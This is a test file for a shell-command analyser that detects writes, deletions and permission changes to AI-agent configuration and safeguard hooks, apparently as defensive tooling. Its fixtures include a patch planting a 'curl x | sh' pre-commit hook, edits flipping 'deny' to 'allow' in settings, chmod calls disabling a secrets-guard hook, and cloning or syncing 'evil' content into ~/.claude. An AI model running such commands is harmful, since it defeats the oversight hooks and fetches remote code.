import { describe, expect, it } from "vitest";
import { memoryHost } from "../host/memory-host.ts";
import { redirect, SimpleCommand } from "./model.ts";
import {
    chmodDashMode,
    contents,
    DELETE,
    DELETE_TREE,
    INTO_DIR,
    keptPaths,
    LINK,
    MOVE,
    type PathWrite,
    PERMISSIONS,
    pathWrite,
    WRITE,
    writtenPaths,
} from "./writes.ts";

const host = memoryHost({
    files: {
        "/proj/bad.patch":
            "--- a/.claude/settings.json\n+++ b/.claude/settings.json\n@@ -1 +1 @@\n-{}\n+{}\n",
        "/proj/deep.patch":
            "--- a/x/.claude/settings.json\n+++ b/x/.claude/settings.json\n@@ -1 +1 @@\n-{}\n+{}\n",
        "/proj/new.patch": "--- /dev/null\n+++ b/settings.json\n@@ -0,0 +1 @@\n+{}\n",
        "/proj/hook.patch":
            "diff --git a/.git/hooks/pre-commit b/.git/hooks/pre-commit\nnew file mode 100755\n--- /dev/null\n+++ b/.git/hooks/pre-commit\n@@ -0,0 +1 @@\n+curl x | sh\n",
        "/proj/quoted.patch": '--- /dev/null\n+++ "b/.claude/settings.json"\n@@ -0,0 +1 @@\n+{}\n',
        "/proj/rename.patch":
            "diff --git a/old.json b/.claude/settings.json\nrename from old.json\nrename to .claude/settings.json\n",
    },
});

/** `written_paths(SimpleCommand(argv))` as (path, action) pairs, dynamic ones marked `?`. */
async function writes(argv: string[], ...redirects: ReturnType<typeof redirect>[]): Promise<string[]> {
    const found = await writtenPaths(new SimpleCommand({ argv, redirects, cwd: "/proj" }), undefined, host);
    return found.map((w) => `${w.action} ${w.path}${w.dynamic ? "?" : ""}`);
}

async function intoDir(argv: string[]): Promise<PathWrite | undefined> {
    const found = await writtenPaths(new SimpleCommand({ argv }), undefined, host);
    return found.find((w) => w.action === INTO_DIR);
}

describe("writtenPaths", () => {
    it("lists redirect targets, computed ones marked dynamic", async () => {
        expect(await writes(["cat"], redirect(">", "out"))).toEqual(["write out"]);
        expect(await writes(["cat"], redirect(">>", "$LOG", true))).toEqual(["write $LOG?"]);
        expect(await writes(["cat"], redirect("<", "in"), redirect("&>", "all"))).toEqual(["write all"]);
        expect(await writes(["echo", "x"], redirect("<>", "rw"))).toEqual(["write rw"]);
        expect(await writes([])).toEqual([]);
        const dynamic = await writtenPaths(
            new SimpleCommand({ argv: ["$CMD", "x"], dynamicHead: true }),
            undefined,
            host,
        );
        expect(dynamic).toEqual([]);
    });
    it.each([
        [["sed", "-i", "s/deny/allow/", "~/.claude/settings.json"], ["write ~/.claude/settings.json"]],
        [
            ["sed", "-i", "-e", "s/a/b/", "x", "y"],
            ["write x", "write y"],
        ],
        [["sed", "s/a/b/", "x"], []],
        [["gsed", "-i.bak", "s/x/y/", "f"], ["write f"]],
        [
            ["perl", "-pi", "-e", "s/a/b/", "f1", "f2"],
            ["write f1", "write f2"],
        ],
        [["perl", "-i.bak", "s.pl", "f"], ["write f"]],
        [["perl", "-pe", "s/a/b/", "f"], []],
        [["dd", "if=/dev/zero", "of=out.img"], ["write out.img"]],
        [["ed", "-s", "file"], ["write file"]],
        [["patch", "-p1", "target"], ["write target"]],
        [
            ["tee", "-a", "x", "y"],
            ["write x", "write y"],
        ],
        [["touch", "-d", "now", "f"], ["write f"]],
        [["truncate", "-s", "0", "f"], ["write f"]],
    ])("in-place editors and writers: %j", async (argv, expected) => {
        expect(await writes(argv)).toEqual(expected);
    });
    it.each([
        [
            ["rm", "-rf", "x", "y"],
            [`${DELETE_TREE} x`, `${DELETE_TREE} y`],
        ],
        [["rm", "x"], [`${DELETE} x`]],
        [["rm", "--rec", "x"], [`${DELETE_TREE} x`]],
        [["rm", "--", "-rf"], [`${DELETE} -rf`]],
        [["rm", "-r", "--", "x"], [`${DELETE_TREE} x`]],
        [["shred", "-n", "3", "f"], [`${DELETE} f`]],
        [["trash", "x"], [`${DELETE} x`]],
        [["unlink", "x"], [`${DELETE} x`]],
        [["rmdir", "d"], [`${DELETE} d`]],
    ])("deletions: %j", async (argv, expected) => {
        expect(await writes(argv)).toEqual(expected);
    });
    it.each([
        [["chmod", "-R", "755", "/etc"], ["permissions /etc"]],
        [["chmod", "-R", "000", "~/.codex"], ["permissions ~/.codex"]],
        // A mode that starts with a dash reads as an option (live-session review).
        [
            ["chmod", "-r", "~/.claude/hooks/secrets_guard.py"],
            ["permissions ~/.claude/hooks/secrets_guard.py"],
        ],
        [["chmod", "-R", "-rwx", "~/.claude"], ["permissions ~/.claude"]],
        [["chmod", "-x", "scripts/build.sh"], ["permissions scripts/build.sh"]],
        // GNU chmod reads a later dash mode as the mode, so every operand is a target.
        [
            ["chmod", "644", "~/.claude/hooks/secrets_guard.py", "-x"],
            ["permissions 644", "permissions ~/.claude/hooks/secrets_guard.py"],
        ],
        [
            ["chmod", "--reference=/var/tmp/mode", "~/.claude/settings.json"],
            ["permissions ~/.claude/settings.json"],
        ],
        [
            ["chown", "-R", "me", "x", "y"],
            ["permissions x", "permissions y"],
        ],
        [["chgrp", "g", "f"], ["permissions f"]],
        [["chflags", "uchg", "f"], ["permissions f"]],
        [
            ["chattr", "+i", "f"],
            ["permissions +i", "permissions f"],
        ], // the attribute reads as a target too
        [["setfacl", "-m", "u:x:rw", "f"], ["permissions f"]],
        [
            ["xattr", "-w", "k", "v", "f"],
            ["permissions v", "permissions f"],
        ],
    ])("permissions: %j", async (argv, expected) => {
        expect(await writes(argv)).toEqual(expected);
    });
    it.each([
        [
            ["install", "-m", "644", "hooks.json", "~/.codex/"],
            ["write ~/.codex/", "write ~/.codex/hooks.json", "into-dir ~/.codex/"],
        ],
        [
            ["cp", "-t", "~/.claude/", "settings.json"],
            ["write ~/.claude/settings.json", "into-dir ~/.claude/"],
        ],
        [
            ["rsync", "-a", "evil/", "~/.claude/"],
            ["write ~/.claude/", "into-dir ~/.claude/"],
        ],
        [
            ["rsync", "--remove-source-files", "~/.claude/settings.json", "/var/tmp/"],
            [
                "write /var/tmp/",
                "write /var/tmp/settings.json",
                "into-dir /var/tmp/",
                `${MOVE} ~/.claude/settings.json`,
            ],
        ],
        [
            ["mv", "a", "b", "dir/"],
            ["write dir/", "write dir/a", "write dir/b", "into-dir dir/", `${MOVE} a`, `${MOVE} b`],
        ],
        [
            ["mv", "-t", "dir", "a", "b"],
            ["write dir/a", "write dir/b", "into-dir dir", `${MOVE} a`, `${MOVE} b`],
        ],
        [
            ["ln", "-sf", "/tmp/x", "~/.claude/settings.json"],
            [
                `${LINK} ~/.claude/settings.json`,
                `${LINK} ~/.claude/settings.json/x`,
                "into-dir ~/.claude/settings.json",
            ],
        ],
        [
            ["cp", "--parents", ".claude/settings.json", "../other"],
            ["write ../other/.claude/settings.json", "into-dir ../other"],
        ],
        [
            ["cp", "--pa", "src/a.c", "build/"],
            ["write build/src/a.c", "into-dir build/"],
        ],
        [
            ["rsync", "-aR", "template/./.claude/", "."],
            ["write ./.claude", "into-dir ."],
        ],
        [
            ["rsync", "-a", "-e", "R", ".claude/settings.json", "../other"],
            ["write ../other", "write ../other/settings.json", "into-dir ../other"],
        ],
        [
            ["scp", "-P", "22", "a", "h:b"],
            ["write h:b", "write h:b/a", "into-dir h:b"],
        ],
        [["cp", "only"], []],
    ])("copies and moves: %j", async (argv, expected) => {
        expect(await writes(argv)).toEqual(expected);
    });
    it("describes what a copy puts into its directory", async () => {
        expect((await intoDir(["cp", "-r", "template/.", "."]))?.contents).toEqual(
            contents({ sources: ["template/."], recursive: true }),
        );
        expect((await intoDir(["cp", "-rL", "linked-source/.", "."]))?.contents?.followLinks).toBe(true);
        expect(
            (await intoDir(["cp", "-r", "--dereference", "linked-source/.", "."]))?.contents?.followLinks,
        ).toBe(true);
        expect((await intoDir(["cp", "-rLP", "linked-source/.", "."]))?.contents?.followLinks).toBe(false);
        expect((await intoDir(["rsync", "-rL", "linked-source/", "."]))?.contents).toEqual(
            contents({
                sources: ["linked-source/"],
                recursive: true,
                followLinks: true,
                slashCopiesContents: true,
            }),
        );
        expect(
            (await intoDir(["rsync", "-rL", "--no-copy-links", "linked-source/", "."]))?.contents
                ?.followLinks,
        ).toBe(false);
        expect(
            (await intoDir(["rsync", "-rL", "--no-copy-links", "-k", "linked-source/", "."]))?.contents
                ?.followLinks,
        ).toBe(true);
        expect(
            (await intoDir(["rsync", "-rk", "--no-k", "linked-source/", "."]))?.contents?.followLinks,
        ).toBe(false);
        expect(
            (await intoDir(["rsync", "-r", "--copy-unsafe-links", "linked-source/", "."]))?.contents
                ?.followLinks,
        ).toBe(true);
        expect((await intoDir(["rsync", "-aR", "template/./.claude", "."]))?.contents).toEqual(
            contents({
                sources: ["template/./.claude"],
                recursive: true,
                slashCopiesContents: true,
                keepParents: true,
                rsyncRelative: true,
            }),
        );
        expect((await intoDir(["rsync", "-aR", "--no-relative", "x", "."]))?.contents?.keepParents).toBe(
            false,
        );
        expect((await intoDir(["ditto", "src", "dst"]))?.contents).toEqual(
            contents({ sources: ["src"], recursive: true, copiesContents: true }),
        );
        expect((await intoDir(["mv", "a", "b", "dir/"]))?.contents?.recursive).toBe(true);
    });
    it("reads BSD cp's `src/` as its contents on darwin only", async () => {
        const darwin = memoryHost({ platform: "darwin" });
        const command = new SimpleCommand({ argv: ["cp", "-r", "src/", "dst"] });
        expect(
            (await writtenPaths(command, undefined, darwin)).find((w) => w.action === INTO_DIR)?.contents
                ?.slashCopiesContents,
        ).toBe(true);
        expect(
            (await writtenPaths(command, undefined, host)).find((w) => w.action === INTO_DIR)?.contents
                ?.slashCopiesContents,
        ).toBe(false);
    });
    it.each([
        [["curl", "-o", "~/.claude/hooks/x.py", "https://example.com"], ["write ~/.claude/hooks/x.py"]],
        [
            ["curl", "-sLo", "~/.claude/settings.json", "https://example.com/s"],
            ["write ~/.claude/settings.json"],
        ],
        [
            ["wget", "-qO", "~/.claude/settings.json", "https://example.com/s"],
            ["write ~/.claude/settings.json"],
        ],
        [["curl", "-sSL", "https://example.com/s", "-o", "out.json"], ["write out.json"]],
        [["curl", "-O", "https://example.com/a/b.tgz?x=1"], ["write b.tgz"]],
        [["wget", "https://example.com/dir/"], ["write dir"]],
        [["wget", "-nv", "-P", "dl", "https://example.com/f.zip"], ["write dl/f.zip"]],
        [["curl", "--output-dir", "out", "-O", "https://h/x.tgz"], ["write out/x.tgz"]],
        [["curl", "-o", "-", "https://h"], []],
        [["curl", "-s", "https://h"], []],
    ])("downloads: %j", async (argv, expected) => {
        expect(await writes(argv)).toEqual(expected);
    });
    it.each([
        [["unzip", "-o", "payload.zip", "-d", "~/.claude"], ["into-dir ~/.claude"]],
        [["unzip", "-l", "payload.zip"], []],
        [["unzip", "docs.zip"], ["into-dir ."]],
        [["tar", "xzf", "p.tgz", "-C", "~/.claude"], ["into-dir ~/.claude"]],
        [["tar", "-tzf", "p.tgz", "-C", "~/.claude"], []],
        [["tar", "xf", "payload.tar"], ["into-dir ."]],
        [["tar", "--extract", "--file=a.tar", "-O"], []],
        [["tar", "xz"], ["into-dir ."]],
        [["7z", "x", "a.7z", "-oout"], ["into-dir out"]],
        [["7z", "l", "a.7z"], []],
    ])("extractions: %j", async (argv, expected) => {
        expect(await writes(argv)).toEqual(expected);
    });
    it("describes the archive an extraction reads", async () => {
        expect((await intoDir(["unzip", "-o", "payload.zip", "-d", "~/.claude"]))?.contents).toEqual(
            contents({ archive: "payload.zip", zipArchive: true }),
        );
        expect((await intoDir(["tar", "-xf", "nested.tar", "--strip-components=1"]))?.contents).toEqual(
            contents({ archive: "nested.tar", strip: 1 }),
        );
        expect((await intoDir(["tar", "-xPf", "a.tar"]))?.contents).toEqual(
            contents({ archive: "a.tar", absoluteNames: true }),
        );
        expect((await intoDir(["tar", "-x", "-fa.tar"]))?.contents?.archive).toBe("a.tar");
        expect((await intoDir(["tar", "xzf", "p.tgz"]))?.contents?.archive).toBe("p.tgz");
        expect((await intoDir(["tar", "xz"]))?.contents).toBeUndefined(); // stdin
        expect((await intoDir(["tar", "-xzf", "x.tgz", "--transform=s/a/b/"]))?.contents).toBeUndefined();
        expect((await intoDir(["tar", "-xf", "a.tar", "--strip-components=N"]))?.contents).toBeUndefined();
        expect((await intoDir(["unzip"]))?.contents).toBeUndefined();
    });
    it.each([
        [
            ["git", "clone", "https://example.invalid/evil", "~/.claude/plugins/evil"],
            ["into-dir ~/.claude/plugins/evil"],
        ],
        [["git", "clone", "https://example.invalid/evil.git"], ["into-dir evil"]],
        [["git", "clone", "git@github.com:org/repo.git"], ["into-dir repo"]],
        [["git", "-C", "~/.claude/plugins", "clone", "https://x/e.git"], ["into-dir ~/.claude/plugins/e"]],
        [["git", "-C", "a", "-C", "b", "clone", "https://x/e"], ["into-dir a/b/e"]],
        [["git", "worktree", "add", "~/.claude/x"], ["into-dir ~/.claude/x"]],
        [["git", "submodule", "add", "https://x/y.git", "vendor/y"], ["into-dir vendor/y"]],
        [["git", "clone", "https://x/$R"], ["into-dir $R?"]],
        [
            ["git", "config", "-f", "~/.codex/config.toml", "--add", "a.b", "c"],
            ["write ~/.codex/config.toml"],
        ],
        [["git", "config", "-f", "x", "--get", "a.b"], []],
        [["git", "config", "-f", "x", "a.b"], []],
        [["git", "config", "-f", "x", "a.b", "v"], ["write x"]],
        [["git", "config", "--file=x", "set", "a.b", "v"], ["write x"]],
        [["git", "config", "-f", "x", "list"], []],
        [["git", "config", "--blob=HEAD:x", "a.b", "v"], []],
        [["git", "status"], []],
    ])("git: %j", async (argv, expected) => {
        expect(await writes(argv)).toEqual(expected);
    });
    it.each([
        [["git", "apply", "bad.patch"], ["write .claude/settings.json"]],
        [["git", "apply", "--index", "bad.patch"], ["write .claude/settings.json"]],
        [["git", "apply", "-p2", "deep.patch"], ["write .claude/settings.json"]],
        [["git", "apply", "deep.patch"], ["write x/.claude/settings.json"]],
        [["git", "apply", "--directory=.claude", "new.patch"], ["write .claude/settings.json"]],
        [["git", "apply", "hook.patch"], ["write .git/hooks/pre-commit"]],
        [["git", "apply", "quoted.patch"], ["write .claude/settings.json"]],
        [["git", "apply", "rename.patch"], ["write .claude/settings.json"]],
        [["git", "apply", "new.patch"], ["write settings.json"]],
        [["git", "apply", "$P"], ["write $(patch)?"]],
        [["git", "apply"], ["write $(patch)?"]], // the patch arrives on a pipe
        [["git", "apply", "missing.patch"], ["write $(patch)?"]],
        [["git", "apply", "--check", "bad.patch"], []],
        [["git", "apply", "--cached", "bad.patch"], []],
        [["git", "apply", "--stat", "bad.patch"], []],
    ])("git apply reads its targets from the patch: %j", async (argv, expected) => {
        expect(await writes(argv)).toEqual(expected);
    });
    it("reads a patch from a redirect, heredoc or the line's own writes", async () => {
        expect(await writes(["git", "apply"], redirect("<", "bad.patch"))).toEqual([
            "write .claude/settings.json",
        ]);
        expect(await writes(["git", "apply"], redirect("<", "$P", true))).toEqual(["write $(patch)?"]);
        const body = "--- a/.claude/settings.json\n+++ b/.claude/settings.json\n@@ -1 +1 @@\n-{}\n+{}\n";
        expect(await writes(["git", "apply"], redirect("<<", "EOF", false, body))).toEqual([
            "write .claude/settings.json",
        ]);
        expect(
            await writes(["git", "apply"], redirect("<<<", "--- a/x.c\t2024-01-01\n+++ b/x.c\t2024-01-02\n")),
        ).toEqual(["write x.c"]);
        expect(await writes(["git", "apply"], redirect("<<<", '+++ "b/unterminated\n'))).toEqual([]);
        const written = new Map([
            ["/proj/mine.patch", { text: "--- /dev/null\n+++ b/.mcp.json\n", replaces: true }],
        ]);
        const command = new SimpleCommand({ argv: ["git", "apply", "mine.patch"], cwd: "/proj" });
        expect(await writtenPaths(command, written, host)).toEqual([pathWrite(".mcp.json", WRITE)]);
    });
});

describe("keptPaths", () => {
    it.each([
        ["/a/b", false, ["a/b"]],
        ["./x/y", false, ["x/y"]],
        ["../x", false, ["../x"]],
        ["/srv/./app/x", true, ["app/x"]],
        ["host:a/b", true, ["a/b"]],
        ["host::mod/a/b", true, ["a/b"]],
        ["rsync://h/m/a/b", true, ["a/b"]],
        ["../up/.claude", true, ["../up/.claude", "up/.claude"]],
        ["a/", false, ["a"]],
        ["./", false, []],
        ["/", true, []],
        [".", false, []],
    ])("keptPaths(%j, %s)", (source, relative, expected) => {
        expect(keptPaths(source, relative)).toEqual(expected);
    });
});

describe("chmodDashMode", () => {
    it.each([
        [["-x", "f"], false, "-x"],
        [["-R", "-rwx", "d"], false, "-rwx"],
        [["644", "f", "-x"], false, undefined],
        [["644", "f", "-x"], true, "-x"],
        [["--", "-x"], false, undefined],
        [["-rw,g+x", "f"], false, "-rw,g+x"],
        [["-w+s", "f"], false, "-w+s"],
        [["-R", "755", "d"], false, undefined],
    ])("chmodDashMode(%j, %s)", (args, anywhere, expected) => {
        expect(chmodDashMode(args, anywhere)).toBe(expected);
    });
    it("exports the action names", () => {
        expect([WRITE, DELETE, DELETE_TREE, INTO_DIR, MOVE, PERMISSIONS, LINK]).toEqual([
            "write",
            "delete",
            "delete-tree",
            "into-dir",
            "move",
            "permissions",
            "link",
        ]);
    });
});
